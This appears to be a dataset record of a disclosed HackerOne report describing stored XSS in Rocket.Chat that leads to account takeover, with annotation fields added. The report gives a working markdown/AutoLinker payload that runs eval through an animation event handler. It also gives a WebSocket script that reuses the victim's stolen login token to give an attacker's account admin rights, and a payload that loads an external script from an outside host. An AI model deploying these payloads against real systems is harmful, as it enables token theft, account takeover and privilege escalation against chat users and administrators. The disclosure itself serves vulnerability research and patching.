{
    "reported_to": "Rocket.Chat",
    "reported_by": "sectex ",
    "title": "Account takeover via XSS",
    "content": "\nSummary: By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.\nDescription: By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute.\nCode 229 Bytes\n1https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[] target=_blank data-x=`.`)\nresults in:\nCode 494 Bytes\n1<a href=\"https://a?p=<a href=\" https:=\"\" style=\"animation-duration:1s;animation-name:blink;animation-iteration-count:2\" onanimationiteration=\"Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[]\" target=\"_blank\" data-x=\"<span\" class=\"copyonly\">`<span><code class=\"code-colors inline\">.</code></span><span class=\"copyonly\">`</span>\" target=\"_blank\" rel=\"noopener noreferrer\"&gt; </a>\n2\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!=\"\nTo obtain the login-token of the victim we can either use document.cookie or localStorage.getItem('Meteor.loginToken').\nSince we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).\nReleases Affected:\nRocket.Chat-Desktop-Client: v2.16.2\nRocket.Chat-Server: v2.0.0\nApps-Engine-Version: v1.5.2\nSteps To Reproduce (from initial installation to vulnerability):\nIn this example, the role admin is assigned to the desired user as far as the victim has the required permissions.\nCode (replace {ATTACKER_USERID} and {ATTACKER_EMAIL}):\nCode 1.11 KiB\n1    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);\n2    ws.onmessage = function (evt) {\n3        if (/\\[\"{\\\\\"msg\\\\\":\\\\\"pong\\\\\"}\"\\]/.test(event.data)) {\n4            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"pong\\\\\"}\"]');\n5        }\n6        if (/a\\[\"{\\\\\"server_id\\\\\":\\\\\"(.*)\\\\\"}\"\\]/.test(event.data)) {\n7            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"connect\\\\\",\\\\\"version\\\\\":\\\\\"1\\\\\",\\\\\"support\\\\\":[\\\\\"1\\\\\",\\\\\"pre2\\\\\",\\\\\"pre1\\\\\"]}\"]');\n8            ws.send(`[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":[{\\\\\"resume\\\\\":\\\\\"${localStorage.getItem('Meteor.loginToken')}\\\\\"}],\\\\\"id\\\\\":\\\\\"1\\\\\"}\"]`);\n9        }\n10        if (/a\\[\"{\\\\\"msg\\\\\":\\\\\"connected\\\\\",\\\\\"session\\\\\":\\\\\"(.*)\\\\\"}\"\\]/.test(event.data)) {\n11            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"insertOrUpdateUser\\\\\",\\\\\"params\\\\\":[{\\\\\"_id\\\\\":\\\\\"{ATTACKER_USERID}\\\\\",\\\\\"statusText\\\\\":\\\\\"\\\\\",\\\\\"email\\\\\":\\\\\"{ATTACKER_EMAIL}\\\\\",\\\\\"verified\\\\\":false,\\\\\"password\\\\\":\\\\\"\\\\\",\\\\\"requirePasswordChange\\\\\":false,\\\\\"joinDefaultChannels\\\\\":false,\\\\\"sendWelcomeEmail\\\\\":false,\\\\\"roles\\\\\":[\\\\\"user\\\\\",\\\\\"admin\\\\\"]}],\\\\\"id\\\\\":\\\\\"17\\\\\"}\"]');\n12        }\n13    };\nPayload (replace sectex.dev\\x2ffiles\\x2fcswsh.js):\nCode 364 Bytes\n1https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2ffiles\\x2fcswsh.js\\x27;document.body.appendChild\\x28s\\x29;'instanceof[] target=_blank data-x=`.`)\nSupporting Material/References:\nSuggested mitigation\nFix initial XSS\nImpact\nAttackers can execute scripts which can lead to:\nAccount takeover\nAbitrary file read in Rocket.Chat-Desktop\nRCE in Rocket.Chat-Desktop (#276031)\nAccount takeover\nAbitrary file read in Rocket.Chat-Desktop\nRCE in Rocket.Chat-Desktop (#276031)\n\n",
    "severity": [
        9.0,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-site Scripting (XSS) - Stored"
    ],
    "screenshots": {},
    "disclosed_date": 1617193800,
    "report_url": "https://hackerone.com/reports/735638",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Inject a malicious XSS payload by combining AutoLinker and Markdown to break out of the HTML attribute context."
        ],
        [
            2,
            "Use the injected script to steal the victim's login token via document.cookie or localStorage.getItem('Meteor.loginToken')."
        ],
        [
            3,
            "Authenticate against the websocket using the stolen token to perform actions in the victim's context (e.g., change password, email, etc.)."
        ]
    ],
    "vuln_description": "This vulnerability allows an attacker to perform an account takeover via XSS by injecting malicious scripts through a combination of AutoLinker and Markdown. The attacker can steal the victim's login token and authenticate against the websocket to perform actions as the victim.",
    "reason": "The attack involves multiple components (XSS injection, token theft, websocket authentication) and requires understanding subtle interactions between AutoLinker and Markdown parsing. Additionally, the attack manipulates complex application states (websocket sessions) and uses novel logic (animation events for script execution).",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "#276031",
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "reason": "The vulnerability involves an XSS attack that leads to account takeover by stealing the victim's login token via localStorage. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs within the same application. Since this attack involves executing malicious scripts to steal tokens rather than directly testing authorization boundaries through session/resource manipulation, it doesn't fit neatly into the described detection methods.",
        "is_detectable": false
    }
}